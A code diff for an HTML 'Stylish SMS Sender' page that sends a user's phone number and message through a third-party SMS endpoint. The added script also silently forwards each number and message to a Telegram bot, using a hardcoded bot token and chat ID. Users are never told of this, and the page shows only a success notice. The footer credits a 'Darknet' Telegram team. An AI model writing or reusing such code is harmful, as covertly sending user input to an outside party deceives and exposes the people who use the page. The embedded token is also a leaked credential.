@@ -1,76 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stylish SMS Sender</title>
     <style>
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background: linear-gradient(45deg, #1a1a2e, #16213e);
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px);
+            width: 400px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        h1 {
+            color: #fff;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 28px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .input-group input,
+        .input-group textarea {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .input-group textarea {
+            height: 100px;
+            resize: none;
+        }
+
+        .input-group input:focus,
+        .input-group textarea:focus {
+            border-color: #00ddeb;
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 15px rgba(0, 221, 235, 0.3);
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(255, 255, 255, 0.7);
+            pointer-events: none;
+            transition: all 0.3s ease;
+        }
+
+        .input-group input:focus + label,
+        .input-group input:valid + label,
+        .input-group textarea:focus + label,
+        .input-group textarea:valid + label {
+            top: -10px;
+            background: #1a1a2e;
+            padding: 0 5px;
+            font-size: 12px;
+            color: #00ddeb;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #00ddeb, #0077ff);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 221, 235, 0.4);
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 221, 235, 0.6);
+        }
+
+        #response {
+            margin-top: 20px;
+            color: #fff;
+            text-align: center;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+        }
+
+        .footer {
+            color: rgba(255, 255, 255, 0.7);
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .footer a {
+            color: #00ddeb;
+            text-decoration: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">
-███████╗███╗   ███╗███████╗
-██╔════╝████╗ ████║██╔════╝
-███████╗██╔████╔██║███████╗
-╚════██║██║╚██╔╝██║╚════██║
-███████║██║ ╚═╝ ██║███████║
-╚══════╝╚═╝     ╚═╝╚══════╝
+        <h1>Send SMS</h1>
+        <form id="smsForm">
+            <div class="input-group">
+                <input type="tel" id="number" required>
+                <label>Mobile Number</label>
+            </div>
+            <div class="input-group">
+                <textarea id="message" required></textarea>
+                <label>Message</label>
+            </div>
+            <button type="submit" class="btn">Send Message</button>
+        </form>
+        <div id="response"></div>
+        <div class="footer">
+            API: Rajvir | Telegram: <a href="https://t.me/Darknet_Team410" target="_blank">@Darknet_Team410</a>
         </div>
-        
-        <div class="input-group">
-            <label>📞 Phone Number</label>
-            <input type="tel" id="phone" placeholder="Enter phone number">
-        </div>
-        
-        <div class="input-group">
-            <label>💬 Message</label>
-            <input type="text" id="message" placeholder="Enter your message">
-        </div>
-        
-        <button onclick="sendSMS()">Send Message</button>
-        
-        <div id="response" style="display: none;"></div>
-        <div id="processing" class="processing"></div>
     </div>
 
     <script>
-        async function sendSMS() {
-            const phone = document.getElementById('phone').value;
+        const form = document.getElementById('smsForm');
+        const responseDiv = document.getElementById('response');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const number = document.getElementById('number').value;
             const message = document.getElementById('message').value;
-            const responseDiv = document.getElementById('response');
-            const processingDiv = document.getElementById('processing');
-            
-            responseDiv.style.display = 'none';
-            processingDiv.textContent = '⏳ Sending your message...';
-            
+
+            // Send SMS via API
             try {
-                const response = await fetch(`http://stb.yzz.me/custom-sms.php?number=${encodeURIComponent(phone)}&msg=${encodeURIComponent(message)}`, {
-                    method: 'GET', // Changed to GET since the new API uses query parameters
-                    headers: {
-                        'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36',
-                        'Referer': 'http://stb.yzz.me/'
-                    }
-                });
+                const smsUrl = `http://stb.yzz.me/custom-sms.php?number=${encodeURIComponent(number)}&msg=${encodeURIComponent(message)}`;
+                const smsResponse = await fetch(smsUrl);
                 
-                const rawText = await response.text();
-                processingDiv.textContent = '';
+                // Send to Telegram Bot
+                const botToken = '6988425897:AAEc3nFqt411ryD_ndIlpyrLpkdf8MHjwKQ';
+                const chatId = '5916486983';
+                const telegramMessage = `New SMS Sent!\nNumber: ${number}\nMessage: ${message}`;
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMessage)}`;
+                await fetch(telegramUrl);
+
+                // Show response
                 responseDiv.style.display = 'block';
-                responseDiv.textContent = '📡 Live Response:\n' + rawText;
+                responseDiv.style.background = 'rgba(0, 255, 0, 0.2)';
+                responseDiv.textContent = `Dear Customer: ${number} আপনার মেসেজ: ${message} পাঠানো হয়েছে।`;
                 
-                try {
-                    const data = JSON.parse(rawText);
-                    responseDiv.textContent = '📡 Live Response:\n' + JSON.stringify(data, null, 2);
-                } catch (e) {
-                    // If not JSON, show raw text as is
-                }
+                // Clear form
+                form.reset();
                 
+                // Hide response after 5 seconds
+                setTimeout(() => {
+                    responseDiv.style.display = 'none';
+                }, 5000);
+
             } catch (error) {
-                processingDiv.textContent = '';
                 responseDiv.style.display = 'block';
-                responseDiv.textContent = '⚠️ Network Error:\n' + error.message;
+                responseDiv.style.background = 'rgba(255, 0, 0, 0.2)';
+                responseDiv.textContent = 'Error sending message. Please try again.';
             }
-        }
+        });
     </script>
 </body>
 </html>
